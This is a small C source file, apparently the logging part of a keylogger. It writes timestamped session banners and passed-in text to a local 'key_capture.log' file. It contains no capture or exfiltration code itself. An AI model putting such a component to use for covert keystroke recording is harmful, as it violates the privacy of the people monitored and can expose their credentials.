#include "log.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define LOGFILE_NAME "key_capture.log"

static FILE *log_file = NULL;

void InitializeLog(void) {
    if (log_file != NULL) {
        return;
    }

    log_file = fopen(LOGFILE_NAME, "a");

    if (log_file == NULL) {
        return;
    }

    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    char s[64];
    strftime(s, sizeof(s), "\n[--- Keylogger Session Start: %Y-%m-%d %H:%M:%S ---]\n", tm);

    fputs(s, log_file);
    fflush(log_file);
}

void WriteToLog(const char *text_to_log) {
    if (log_file == NULL) {
        InitializeLog();
        if (log_file == NULL) return;
    }

    fputs(text_to_log, log_file);

    fflush(log_file);
}

void CloseLog(void) {
    if (log_file != NULL) {
        WriteToLog("[--- Keylogger Session Stop ---]\n");

        fclose(log_file);
        log_file = NULL;
    }
}